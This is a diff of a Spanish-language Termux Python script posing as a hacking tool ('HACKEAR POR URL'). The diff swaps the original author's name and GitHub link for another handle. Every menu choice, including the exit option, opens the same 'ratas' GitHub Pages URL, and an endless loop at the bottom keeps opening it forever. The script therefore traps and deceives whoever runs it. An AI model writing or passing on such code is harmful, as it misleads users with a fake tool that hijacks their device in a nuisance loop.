@@ -48,10 +48,10 @@ def cabecera():
 def version():
  texto ="""
  |=======================================================|
- | Script by              : #FENRIR-00                   |
+ | Script by              : #EMANA-00                   |
  | Version                : Version  1.2                 |
- | Follow me on Github    : https://github.com/Fenrir-00 |
- | Contact me on Telegram : @Ritorito1990                |
+ | Follow me on Github    : https://github.com/Ehmana01-00 |
+                |
  ========================================================= """
  lol_py(texto)
 def carga():
@@ -172,16 +172,16 @@ def menu():
     print(f"{color.verde}[3]HACKEAR POR URL")
     print(f"{color.rojo}[0]SALIR{color.fin}")
     eleccion =input(f"{color.cyan}ELIJE UN NUMERO >>{color.fin} ")
-    if eleccion == "1" :
-     os.system("termux-open-url https://fenrir-00.github.io/ratas/")
+    if eleccion == "50" :
+     os.system("termux-open-url https://ehmana01-00.github.io/ratas/")
     elif eleccion == "2" :
-     os.system("termux-open-url https://fenrir-00.github.io/ratas/")
+     os.system("termux-open-url https://ehmana01-00.github.io/ratas/")
     elif eleccion == "3" :
-     os.system("termux-open-url https://fenrir-00.github.io/ratas/")
+     os.system("termux-open-url https://ehmana01-00.github.io/ratas/")
     elif eleccion == "0" :
-     os.system("termux-open-url https://fenrir-00.github.io/ratas/")
+     os.system("termux-open-url https://ehmana01-00.github.io/ratas/")
     else:
         incorrecto()
 menu()
 while 1 < 2:
- os.system("termux-open-url https://fenrir-00.github.io/ratas/")
+ os.system("termux-open-url https://ehmana01-00.github.io/ratas/")
